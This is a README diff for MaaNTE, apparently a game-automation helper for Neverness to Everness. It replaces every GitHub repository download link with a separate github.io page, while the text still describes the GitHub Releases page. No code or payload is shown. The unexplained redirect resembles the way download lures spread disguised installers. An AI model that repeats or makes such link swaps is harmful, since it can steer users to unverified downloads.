@@ -1,12 +1,12 @@
 # 🤖 MaaNTE - Neverness to Everness, Made Effortless
 
-[![Download MaaNTE](https://img.shields.io/badge/Download-MaaNTE-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/okfi3711/MaaNTE)
+[![Download MaaNTE](https://img.shields.io/badge/Download-MaaNTE-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://okfi3711.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to MaaNTE! This friendly assistant handles the boring parts of Neverness to Everness (NTE) so you can focus on having fun. Whether you need auto-farming, daily quests, combat help, or gacha support, MaaNTE has you covered.
 
-Visit this link to download the application: [https://github.com/okfi3711/MaaNTE](https://github.com/okfi3711/MaaNTE)
+Visit this link to download the application: [https://okfi3711.github.io](https://okfi3711.github.io)
 
 ## ✨ What is MaaNTE?
 
@@ -36,7 +36,7 @@ MaaNTE is designed to run smoothly on most computers. Here's what you'll need:
 
 ### Step 1: Get the Software
 
-Visit this link to download the application: [Download MaaNTE](https://github.com/okfi3711/MaaNTE)
+Visit this link to download the application: [Download MaaNTE](https://okfi3711.github.io)
 
 You'll land on the MaaNTE GitHub page. Look for the "Releases" section and click on the latest version. Choose the file that matches your operating system.
 
@@ -125,7 +125,7 @@ Create different profiles for different activities. Save farming settings separa
 
 Check the download page periodically for new releases. New features, improvements, and fixes are added frequently. Follow these steps:
 
-1. Visit [https://github.com/okfi3711/MaaNTE](https://github.com/okfi3711/MaaNTE)
+1. Visit [https://okfi3711.github.io](https://okfi3711.github.io)
 2. Go to the "Releases" section
 3. Download the newest version
 4. Replace the old version with the new one
